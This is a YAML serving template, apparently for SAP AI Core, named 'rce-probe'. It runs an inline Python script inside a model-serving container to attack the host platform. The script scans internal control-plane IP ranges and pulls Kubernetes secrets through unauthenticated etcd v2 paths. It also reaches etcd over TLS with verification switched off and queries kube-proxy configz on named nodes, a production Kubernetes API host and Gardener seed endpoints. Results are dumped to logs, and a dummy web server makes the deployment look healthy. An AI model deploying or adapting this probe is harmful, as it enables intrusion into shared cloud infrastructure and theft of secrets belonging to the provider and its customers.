apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "4.13.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "etcd-8080-2379-kube-proxy-10249-ctrlplane"
    executables.ai.sap.com/name: "rce-probe"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import os, socket, ssl, struct, json

            print('[PROBE_V413_START]', flush=True)

            def emit(label, data):
                flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
                for i in range(0, max(1, len(flat)), 4000):
                    print(f'[{label}_{i}] {flat[i:i+4000]}', flush=True)

            def http_get_raw(host, port, path, method='GET', extra_headers='',
                             body='', timeout=10, use_tls=False):
                try:
                    s = socket.socket(); s.settimeout(timeout)
                    if use_tls:
                        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                        s = ctx.wrap_socket(s, server_hostname=host)
                    s.connect((host, port))
                    req = (f'{method} {path} HTTP/1.0\r\n'
                           f'Host: {host}:{port}\r\n'
                           f'{extra_headers}'
                           f'\r\n{body}')
                    s.sendall(req.encode())
                    resp = b''
                    while True:
                        c = s.recv(65536)
                        if not c: break
                        resp += c
                    s.close()
                    return resp.decode(errors='replace')
                except Exception as ex:
                    return f'ERR:{ex}'

            def tcp_probe(host, port, timeout=4):
                try:
                    s = socket.socket(); s.settimeout(timeout)
                    s.connect((host, port))
                    s.close()
                    return 'OPEN'
                except socket.timeout:
                    return 'TIMEOUT'
                except Exception as e:
                    return f'{type(e).__name__}:{e}'

            # ── 1. Scan 10.250.0.x range for etcd/control plane ──────────────────
            print('[CTRL_PLANE_SCAN_START]', flush=True)
            for last_octet in range(1, 20):
                ip = f'10.250.0.{last_octet}'
                for port in [2379, 8080, 443, 6443]:
                    r = tcp_probe(ip, port, timeout=2)
                    if r == 'OPEN':
                        emit(f'SCAN_OPEN_{ip}_{port}', r)

            # ── 2. etcd HTTP :8080 (legacy v2 API, may be unauthenticated) ────────
            print('[ETCD_HTTP_PROBE_START]', flush=True)
            etcd_http_targets = [
                ('10.250.0.0', 8080),
                ('10.250.0.1', 8080),
                ('10.250.0.2', 8080),
            ]
            for host, port in etcd_http_targets:
                for path in ['/health', '/v2/keys/', '/v2/members', '/metrics',
                             '/v2/keys/registry/secrets/default/', '/v2/keys/registry/']:
                    r = http_get_raw(host, port, path, timeout=6)
                    if not r.startswith('ERR:'):
                        emit(f'ETCD_HTTP_{host}_{port}_{path.replace(\"/\",\"_\")}', r[:3000])

            # ── 3. etcd HTTPS :2379 — see TLS cert, try without client cert ───────
            print('[ETCD_GRPC_PROBE_START]', flush=True)
            for host in ['10.250.0.0', '10.250.0.1', '10.250.0.2']:
                try:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    s = socket.socket(); s.settimeout(8)
                    ss = ctx.wrap_socket(s, server_hostname=host)
                    ss.connect((host, 2379))
                    # Get server cert info
                    cert = ss.getpeercert(binary_form=True)
                    emit(f'ETCD_CERT_{host}', cert.hex()[:400] if cert else 'NO_CERT')
                    # Try HTTP/1.1 health check
                    ss.sendall(b'GET /health HTTP/1.0\r\nHost: ' + host.encode() + b'\r\n\r\n')
                    resp = b''
                    while True:
                        c = ss.recv(4096)
                        if not c: break
                        resp += c
                    ss.close()
                    emit(f'ETCD_2379_{host}_health', resp[:500].decode(errors='replace'))
                except Exception as e:
                    emit(f'ETCD_2379_{host}_ERR', str(e))

            # ── 4. kube-proxy metrics :10249 on each node ─────────────────────────
            print('[KUBE_PROXY_PROBE_START]', flush=True)
            NODE_IPS = ['10.180.1.74', '10.180.12.215', '10.180.13.45', '10.180.35.242']
            for nip in NODE_IPS:
                for kpath in ['/metrics', '/healthz', '/configz']:
                    r = http_get_raw(nip, 10249, kpath, timeout=5)
                    emit(f'KPROXY_{nip}_{kpath.replace(\"/\",\"_\")}', r[:2000])

            # ── 5. K8s API anonymous endpoints (no auth) ──────────────────────────
            k8s_host = 'api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com'
            for path in ['/version', '/.well-known/openid-configuration',
                         '/openid/v1/jwks', '/healthz']:
                r = http_get_raw(k8s_host, 443, path, timeout=8, use_tls=True)
                emit(f'K8S_{path.replace(\"/\",\"_\")}', r[:1500])

            # ── 6. Gardener API server / seed cluster endpoints ───────────────────
            # Gardener uses 10.250.0.0/16 for seed cluster
            for gpath in ['/version', '/healthz', '/api/v1/namespaces']:
                r = http_get_raw('10.250.0.1', 443, gpath, timeout=5, use_tls=True)
                emit(f'GARDENER_{gpath.replace(\"/\",\"_\")}', r[:1000])

            print('[PROBE_V413_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
